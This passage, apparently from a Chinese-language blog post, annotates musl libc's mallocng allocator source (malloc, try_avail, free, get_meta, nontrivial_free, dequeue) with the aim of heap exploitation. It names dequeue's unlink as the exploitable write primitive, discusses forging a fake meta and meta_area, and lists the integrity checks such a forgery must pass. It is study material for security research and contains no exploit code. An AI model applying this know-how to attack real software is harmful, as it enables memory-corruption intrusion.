class="number">1</span>;</span><br><span class="line">        g = ctx.active[sc];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">        first = mask&amp;-mask;</span><br><span class="line">        <span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">            g-&gt;avail_mask = mask-first;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        idx = a_ctz_32(first);</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    upgradelock();</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果当前group 不满足就会来到这里:</span></span><br><span class="line"><span class="comment">      alloc_slot 从group 中取出对应大小chunk 的idx</span></span><br><span class="line"><span class="comment">      这里先从对应sc 的ctx.active[sc] 中找对应的meta的group 有无空闲chunk可以使用</span></span><br><span class="line"><span class="comment">        再从队列中其他meta的group 中找</span></span><br><span class="line"><span class="comment">      如果队列中其他meta的group 有可利用的chunk,就使用</span></span><br><span class="line"><span class="comment">      如果没有就重新分配一个新的group</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g = ctx.active[sc];<span class="comment">// 取出 sc 对应active meta</span></span><br><span class="line"> </span><br><span class="line">success:</span><br><span class="line">    ctr = ctx.mmap_counter;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> enframe(g, idx, n, ctr);<span class="comment">// 从对应meta 中的group 取出 第idx号chunk  n = size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>!!! 关键: 一般分配先进入这个循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    mask = g ? g-&gt;avail_mask : <span class="number">0</span>; <span class="comment">//先检查g所指meta是否存在，若存在mask = g-&gt;avail_mask</span></span><br><span class="line">    first = mask&amp;-mask;                     <span class="comment">//这里只有mask=0时，first才会为0</span></span><br><span class="line">    <span class="keyword">if</span> (!first) <span class="keyword">break</span>;                        <span class="comment">//mask为0，first=0，无可用空闲chunk，跳出循环</span></span><br><span class="line">    <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)<span class="comment">//如果是排它锁, 那么下面保证成功</span></span><br><span class="line">        g-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) <span class="comment">//成功找到并设置avail_mask之后,continue 后设置idx，然后跳出</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    idx = a_ctz_32(first);</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">    upgradelock();</span><br><span class="line">    如果</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br></pre></td></tr></table></figure><p>alloc_slot:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;    <span class="comment">// 尝试从限制active 中找到合适可用的</span></span><br><span class="line">    <span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">    <span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 如果没找到 重新创造一个meta，然后重新分配一个size大小对应sc的group，给这个新分配的meta</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">    <span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    g-&gt;avail_mask--;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.active[sc], g); <span class="comment">//把新meta 加入队列</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>try_avail:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">    <span class="type">uint32_t</span> first;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="keyword">if</span> (!mask)<span class="comment">//mask = m-&gt;avail_mask (!mask) 表示没有可用的chunk了</span></span><br><span class="line">    &#123;                                        </span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;freed_mask) <span class="comment">// if (!m-&gt;freed_mask) &lt;=&gt; 没有已经释放的chunk</span></span><br><span class="line">        &#123;                                </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:既没有可用的chunk，也没有被释放还未回收的chunk，即chunk都被使用，且都没被释放</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            dequeue(pm, m); <span class="comment">// freed_mask==avail_mask=0, group 空间已满 让对应的meta 出队</span></span><br><span class="line">            m = *pm;</span><br><span class="line">            <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        这里else表示的是:无可用空闲chunk，但是有已经释放的chunk</span></span><br><span class="line"><span class="comment">        !!! free释放的chunk 不能马上被复用的 !!!</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:没有可用的chunk，有被释放还未回收的chunk。</span></span><br><span class="line"><span class="comment">       有点好奇这里，如果达成这个条件，然后利用指针互写，修改m-&gt;next 伪造的meta，是不是就可以制造fake meta 入队的假象</span></span><br><span class="line"><span class="comment">       若meta链表中没有，一般meta 的next和prev 都是指向自己</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        mask = m-&gt;freed_mask;</span><br><span class="line">        <span class="comment">// 如果这个meta 的group 只含有一个chunk ，且被释放就跳过，</span></span><br><span class="line">        <span class="comment">// 或者 这个meta 的group 根本不能被释放 如mmap 的 group last_idx = 0 freeable=1</span></span><br><span class="line">        <span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable)</span><br><span class="line">        &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">            mask = m-&gt;freed_mask;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">        <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">        <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">        <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (m-&gt;next != m)</span><br><span class="line">            &#123; <span class="comment">// 如果这个meta 后还有meta 就切换到 下一个meta</span></span><br><span class="line">                m = m-&gt;next;</span><br><span class="line">                *pm = m;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">                <span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">                <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">                <span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) <span class="comment">// 页对齐</span></span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    span += size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">                    cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">                m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mask = activate_group(m);<span class="comment">// 这里是给 m的 avail_mask 打上标记</span></span><br><span class="line">        assert(mask);</span><br><span class="line">        decay_bounces(m-&gt; sizeclass);</span><br><span class="line">    &#125;</span><br><span class="line">    first = mask&amp;-mask; <span class="comment">// 若 mask%2==0 则first =结果是能整除这个偶数的最大的2的幂 若 mask%2==1 则first永远为1</span></span><br><span class="line">    m-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="free-1"><a href="#free-1" class="headerlink" title="free:"></a>free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);<span class="comment">// 通过chunk p 用get_meta得到对应的meta</span></span><br><span class="line">    <span class="type">int</span> idx = get_slot_index(p);<span class="comment">// 得到对应chunk的 idx</span></span><br><span class="line">    <span class="type">size_t</span> stride = get_stride(g); <span class="comment">// 得到sizeclasses 中对应chunk类型的size</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">    <span class="comment">//*start = g-&gt;mem-&gt;storage(得到group中第一个chunk地址) + stride*idx(加上对应chunk偏移);</span></span><br><span class="line">    <span class="comment">// start 就为对应p(chunk)的起始地址</span></span><br><span class="line">    <span class="comment">// end 对应结束地址</span></span><br><span class="line"> </span><br><span class="line">    get_nominal_size(p, end);<span class="comment">//算出真实大小</span></span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;<span class="comment">//设置bitmap 标志</span></span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">    *(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">        <span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">        <span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">        <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">        <span class="type">uint32_t</span> mask = freed | avail; <span class="comment">// 将释放的chunk 和 现在可用的 chunk 加起来</span></span><br><span class="line">        assert(!(mask&amp;self));</span><br><span class="line">        <span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//!freed 没有被释放的chunk，mask+self==all说明释放了当前chunk所有chunk 都将被回收</span></span><br><span class="line">        <span class="comment">// 此group 会被弹出队列</span></span><br><span class="line">        <span class="keyword">if</span> (!MT)</span><br><span class="line">            g-&gt;freed_mask = freed+self;<span class="comment">// 设置free_mask 表示chunk 被释放</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    wrlock();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);<span class="comment">// 含有meta 操作 ，内有unlink 是漏洞利用的关键</span></span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="get-meta"><a href="#get-meta" class="headerlink" title="get_meta:"></a>get_meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);<span class="comment">// 得到chunk offset</span></span><br><span class="line">    <span class="type">int</span> index = p[<span class="number">-3</span>] &amp; <span class="number">31</span>;;<span class="comment">// 得到chunk idx</span></span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);<span class="comment">// 通过offset 和chunk 地址计算出group地址</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;<span class="comment">// 从group 得到 meta 地址</span></span><br><span class="line">    assert(meta-&gt;mem == base);<span class="comment">// 检查meta 是否指向对应的group</span></span><br><span class="line">    assert(index &lt;= meta-&gt;last_idx);<span class="comment">// 检查chunk idx 是否超过 meta 最大chunk 容量</span></span><br><span class="line">    assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);<span class="comment">// 得到meta_area 地址</span></span><br><span class="line">    assert(area-&gt;check == ctx.secret);<span class="comment">// 检查 check 校验值</span></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123; <span class="comment">// 如果属于 sizeclasses 管理的chunk 大小</span></span><br><span class="line">        assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">        assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">        assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free:"></a>nontrivial_free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span><span class="comment">// i = idx</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;<span class="comment">//mask=已经被free的chunk +可使用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g))</span><br><span class="line">    &#123;    <span class="comment">/*    </span></span><br><span class="line"><span class="comment">         如果 mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 代表此meta中group里的chunk 都被释放 或者 都被用了</span></span><br><span class="line"><span class="comment">         (2u&lt;&lt;g-&gt;last_idx)-1 计算出的值化成二进制，其中每位含义类似于bitmap，如果每位为1表每位要不是被free 不然就是被</span></span><br><span class="line"><span class="comment">         okay_to_free 检测是否可以被释放</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g-&gt;next)</span><br><span class="line">        &#123;    <span class="comment">// 如果队列中 有下一个meta</span></span><br><span class="line">            assert(sc &lt; <span class="number">48</span>);<span class="comment">// 检测 sc 是不是mmap 分配的</span></span><br><span class="line">      <span class="comment">// 检测当前meta g 和 队列里的active[sc] meta 是否一样，一样则activate_new赋值为1</span></span><br><span class="line">            <span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">            dequeue(&amp;ctx.active[sc], g);<span class="comment">// 当前meta 出队</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta</span></span><br><span class="line">            <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">                activate_group(ctx.active[sc]);<span class="comment">//如果有下一个meta 直接激活 然后修改avail_mask 标志位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> free_group(g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask)</span><br><span class="line">    &#123;<span class="comment">// mask==0 group chunk 空间已被完全使用</span></span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">        <span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="keyword">if</span> (ctx.active[sc] != g) &#123;<span class="comment">// 如果 g 未被加入 队列ctx.ative[sc]</span></span><br><span class="line">            <span class="built_in">queue</span>(&amp;ctx.active[sc], g);<span class="comment">// 把g 加入队列</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a_or(&amp;g-&gt;freed_mask, self);<span class="comment">// 修改对应 的freed_mask 标志 ，表示着对应的chunk 已被释放</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue:"></a>dequeue:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next; <span class="comment">// 这里存在指针互写 在 prev 所指地址上 写入next 指针</span></span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev; <span class="comment">// 在next 所指地址上 写入prev 指针</span></span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;<span class="comment">// 队列头如果为m 那就更新为m-&gt;next</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>; <span class="comment">// 清理m(meta)的头尾指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue触发条件"><a href="#dequeue触发条件" class="headerlink" title="dequeue触发条件"></a>dequeue触发条件</h3><p>1、<code>avail_mask</code> 表示只有一个<code>chunk</code> 被使用 ,<code>freed_mask=0</code>，而<code>free</code> 刚好要<code>free</code> 一个<code>chunk</code>，满足 <code>okay_to_free()</code> 条件 就可以进入<code>dequeue</code> 进行出队操作<br>如<code>add(1,0x20)</code> 再<code>free(1)</code> 就会使得<code>meta</code> 被回收<br>2、<code>avail_mask=0</code>, <code>freed_mask</code> 表示只有 <code>1</code>个 <code>chunk</code> 没被释放，这时释放的<code>chunk</code> 就应该是那最后一个<code>chunk</code><br>如下面情况 <code>avail_mask ==0 free_mask=63=00111111 last_idx = 6</code>，已经释放<code>6</code> 个<code>chunk</code> 还有最后一个<code>chunk</code>没被释放 在释放最后一个<code>chunk</code> 时会触发<code>dequeue</code>使得对应<code>meta</code>出队<br>3、如果发现这个<code>group</code>中所有的<code>chunk</code>要么被<code>free</code>, 要么是可用的, 那么就会回收掉这个<code>group</code>，调用<code>dequeue</code>从队列中出队</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>free 首先会调用 <code>get_meta</code> ，而 <code>get_meta</code> 有如下检查:</p><ul><li><code>assert(!((uintptr_t) p &amp; 15));</code>，即 <code>chunk</code> 应该关于 <code>0x10</code> 对齐</li><li><code>meta-&gt;mem == base</code> ，即 <code>meta</code> 中保存的 <code>group</code> 指针要正确</li><li><code>index &lt;= meta-&gt;last_idx</code> ，即 <code>chunk</code> 的索引不能越界</li><li><code>assert(!(meta-&gt;avail_mask &amp; (1u &lt;&lt; index)));</code> ，<code>assert(!(meta-&gt;freed_mask &amp; (1u &lt;&lt; index)));</code> ，检测 <code>double fre</code></li><li><code>area-&gt;check == ctx.secret</code> ，即 <code>meta</code> 所在的 <code>meta_area</code> 的校验值正确。如果伪造的 <code>meta</code> 位于一个伪造的 <code>meta_area</code> 中，需要首先获取校验值 <code>secret</code> 并保存到 <code>meta_area</code> 开头，即这一页最开始的地方</li><li><code>offset &gt;= size_classes[meta-&gt;sizeclass]_index ，offset &lt; size_classes[meta-&gt;sizeclass]_(index+1)</code> ，这两个检查 <code>offset</code> 和 <code>chunk</code> 大小是否对应</li><li><code>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);</code> ，即检查 <code>offset</code> 是否越界</li></ul><p>紧接着还会调用 <code>get_nominal_size</code>，其中有对 <code>chunk</code> 的检查，总结来说 